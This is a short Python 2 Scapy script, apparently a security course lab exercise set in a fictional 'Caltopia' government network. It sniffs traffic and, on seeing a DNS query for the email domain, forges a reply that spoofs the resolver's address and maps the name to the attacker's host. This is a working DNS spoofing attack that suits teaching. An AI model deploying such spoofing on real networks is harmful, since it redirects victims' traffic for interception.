#!/var/lib/python/python-q3

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

email = "email.gov-of-caltopia.info."
govIP = "10.87.51.131"
emailIP = "8.8.8.8"
eth0 = "10.87.51.132"

def handle_packet(pkt):
    print pkt.show

    # If you wanted to send a packet back out, it might look something like... 
    # ip = IP(...)
    # tcp = TCP(...) 
    # app = ...
    # msg = ip / tcp / app 
    # send(msg) 

    if ((UDP in pkt) and pkt[DNSQR].qname == email and pkt[IP].dst == emailIP and pkt[IP].src == govIP):
    	# send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
    	ip = IP(src = pkt[IP].dst , dst = pkt[IP].src)
    	# udp = UDP(dport=pkt[UDP].sport, sport="domain")
    	udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    	qd = DNSQR(qname=email, qtype="A", qclass="IN")
    	an = DNSRR(rrname=email, type="A", rclass="IN", rdata=eth0)


   		#|<DNS id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=1
 		# nscount=0 arcount=0 qd=<DNSQR qname='www.slashdot.org.' qtype=A qclass=IN |>
 		# an=<DNSRR rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151' |>
 		# ns=0 ar=0 |<Padding load='\xc6\x94\xc7\xeb' |>>>>

     	dns = DNS(id=pkt[DNS].id, qr=1L, opcode="QUERY", aa=0L, tc=0L, rd=1L, ra=1L, z=0L, rcode="ok", qdcount=1, ancount=1,nscount=0, arcount=0, qd=qd, an=an, ns=0, ar=0)   	
    	msg = ip / udp / dns

    	send(msg)

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')

